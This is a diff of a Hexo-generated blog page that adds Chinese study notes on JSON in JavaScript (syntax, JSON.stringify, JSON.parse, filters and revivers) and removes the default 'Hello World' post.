+<li>JSON对象要求给属性加引号，且不用声明变量<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// JavaScript中的表示方式，有变量，无引号</span><br><span class="line">var object = &#123;</span><br><span class="line">        name : &quot;zhangke&quot;;</span><br><span class="line">        age:22;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// JSON的表示方式，没有结尾分号，也不需要变量，但有双引号</span><br><span class="line">&#123;</span><br><span class="line">        &quot;name&quot; : zhangke;</span><br><span class="line">        &quot;age&quot;:22;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="20-1-3-数组"><a href="#20-1-3-数组" class="headerlink" title="20.1.3 数组"></a>20.1.3 数组</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[25,&quot;hi&quot;,true]</span><br></pre></td></tr></table></figure>
+<h3 id="解析与序列化"><a href="#解析与序列化" class="headerlink" title="解析与序列化"></a>解析与序列化</h3><h4 id="JSON对象"><a href="#JSON对象" class="headerlink" title="JSON对象"></a>JSON对象</h4><ol>
+<li>ECMAScript 5对解析JSON的行为进行了规范，定义全局变量JSON</li>
+</ol>
+<ul>
+<li>stringify():将JavaScript对象序列化为JSON字符串</li>
+<li>parse():把JSON字符串解析为原生JavaScript值<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var jsonText = JSON.stringify(book);</span><br><span class="line">var bookCopy = JSON.parse(jsonText);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="序列化选项"><a href="#序列化选项" class="headerlink" title="序列化选项"></a>序列化选项</h4><ol>
+<li>JSON.stringify()还可以接收另外两个参数，用于指定以不同的方式序列化JavaScript对象</li>
+</ol>
+<ul>
+<li><p>过滤器：可以是数组或函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var jsonText = JSON.stringify(book,[&quot;title&quot;,&quot;edition&quot;]); // 数组</span><br><span class="line">var jsonText = JSON.stringify(book,function(key,value)&#123;</span><br><span class="line">            //函数</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>字符串缩进</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var jsonText = JSON.stringify(book,null,4); // 缩进4个字符，该值最大为10</span><br><span class="line">var jsonText = JSON.stringify(book,null,&quot;- - &quot;); // 传入特定字符串作为缩进符</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>toJSON()方法：可以为任何对象添加自定义的toJSON（）方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var book = &#123;</span><br><span class="line">        toJSON:function()&#123;</span><br><span class="line">            return this.title;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line">var jsonText = JSON.stringify(book);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="解析选项"><a href="#解析选项" class="headerlink" title="解析选项"></a>解析选项</h4><ol>
+<li>JSON.parse()方法接收一个还原函数（reviver）起过滤作用</li>
+</ol>
+<ul>
+<li>reviver返回undefined，则表示从结果中删除相应的键</li>
+<li>返回其他值，则将该值插入到结果中<h3 id="小结-4"><a href="#小结-4" class="headerlink" title="小结"></a>小结</h3></li>
+</ul>
+<ol>
+<li>JSON是一个轻量级的数据格式，可以简化表示复杂数据结构的工作量。JSON使用JavaScript语法的子集表示对象、数组、字符串、数值、布尔值和null，即使XML也能表示同样复杂的数据结果。但JSON没有那么烦琐，而且在JavaScript中使用更便利</li>
+<li>ECMAScript 5 定义了一个原生的JSON对象，可以用来将对象序列化为JSON字符串或者将JSON数据解析为JavaScript对象。JSON.stringify()和JSON.parse()方法分别用来实现上述两种功能。这两个方法都有一定的选项，通过它们可以改变过滤或序列化的方式</li>
+</ol>
+
             <div class="post-button text-center">
-              <a class="btn" href="/2018/05/15/Hello-World-0/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-date">
-			<div class="post-month">05月</div>
-			<div class="post-day">14</div>
-	</div>
-  
-
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/14/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/kekelovely.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="KeKeHome">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/05/14/hello-world/" itemprop="url">Hello World</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-14T22:54:33+08:00">
-                2018-05-14
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-            <div class="post-button text-center">
-              <a class="btn" href="/2018/05/14/hello-world/#more" rel="contents">
+              <a class="btn" href="/2018/05/17/3-js/#more" rel="contents">
                 Read more &raquo;
               </a>
             </div>
@@ -1021,7 +2823,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span>
+    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -1130,7 +2932,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-count">52</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
